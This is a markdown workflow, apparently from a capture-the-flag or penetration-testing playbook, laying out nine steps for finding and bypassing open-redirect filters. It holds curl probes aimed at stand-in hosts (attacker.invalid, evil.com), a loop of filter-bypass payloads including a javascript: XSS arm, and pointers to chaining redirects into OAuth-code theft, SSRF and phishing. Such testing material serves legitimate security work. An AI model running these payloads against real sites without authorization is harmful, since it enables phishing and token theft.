# Workflow — the ordered steps for an open-redirect test

## The ordered pass

```text
1. map the redirect-param names       -> param-inventory + the sweep
2. find the redirect surface           -> the Location/meta/JS carriers
3. the first probe — one canary        -> follow=False, read the Location
4. the fingerprint — one Location      -> safe / canary / partial?
5. the filter shape                    -> which arm's failure modes
6. the bypass arms                     -> the filter-shape-specific arms
7. the uniform-falsifier check         -> every arm -> safe?
8. the chain-route                     -> the laundered-trust payoff
9. record — confirm / negative / falsifier
```

## Step 1 — map the params

```bash
# the param sweep — redirect_probe over the usual names
python3 tools/web/redirect_probe.py --url "$BASE/login"
# or one param
python3 tools/web/redirect_probe.py --url "$BASE/login" --param next
```

Read the app's forms/bundle for the real param name — `grep -iE 'next|
redirect|return|goto|continue'` the bundle/source. The error/logout/login
paths are the most-missed surfaces.

## Step 2 — find the carrier

```bash
curl -si "$BASE/login?next=/test" | grep -i '^location'     # the Location
curl -s "$BASE/x?url=/test" | grep -iE 'meta.*refresh'      # the meta
curl -s "$BASE/x?url=/test" | grep -iE 'location\.|window\.location' # the JS
```

## Step 3 — the first probe

```bash
curl -si --max-time 10 \
  "$BASE/login?next=https%3A%2F%2Fattacker.invalid%2Flanding" | grep -i '^location'
# Location: https://attacker.invalid/landing   -> CANDIDATE
# Location: /                                  -> safe arm
```

## Step 4 — the fingerprint

Read the ONE `Location:` — it fingerprints the filter:

| The Location | The fingerprint |
|---|---|
| `Location: https://evil.com` | no filter / a broken check — CANDIDATE |
| `Location: /` | forced-relative — the `/`-check |
| `Location: https://target.com/<the-path>` | a host-force |
| `Location: https://target.com.evil.com` | a substring/suffix gap — the host ends `evil.com` |

## Step 5 — the filter shape

From the fingerprint, pick the matching filter-bypass arms — `filter-bypass-deep.md` + `parser-differentials.md`. The filter shape names which arms to try.

## Step 6 — the bypass arms

```bash
for arm in 'https://evil.com' '//evil.com' '/\evil.com' '/%5cevil.com' \
  'https://target.com@evil.com' 'evil.com\@target.com' \
  'https://target.com.evil.com' 'evil.com/target.com' \
  'https:%2f%2fevil.com' 'javascript:alert(1)'; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$arm")
  echo "=== $arm ==="
  curl -si "$BASE/login?next=$enc" | grep -i '^location'
done
```

## Step 7 — the uniform-falsifier check

Every arm → `Location: <safe>`? The class falsifier fires — record the
arms tried and the uniform safe response.

## Step 8 — the chain-route

A confirmed `Location: <canary>` — route to the payoff: `chain-routes.md`
— OAuth-code-laundering, SSRF-fetch-follow, `javascript:`-XSS, bot-visit,
phishing-launder, or CRLF-split.

## Step 9 — record

```bash
python3 tools/hooks.py post-probe <challenge> --hypothesis-id <id> \
  --class web-open-redirect --verdict confirms --evidence-kind class \
  --evidence 'Location: https://attacker.invalid/landing' \
  --response '<the verbatim 302>'
```

## The budget

Five probes per mechanism, twenty-five per challenge — `../../LOOP_DISCIPLINE.md`.
The mechanism here: the canary + the bypass arms on ONE param surface. A
uniform falsifier on all arms is the stop; a passing arm routes to the chain.
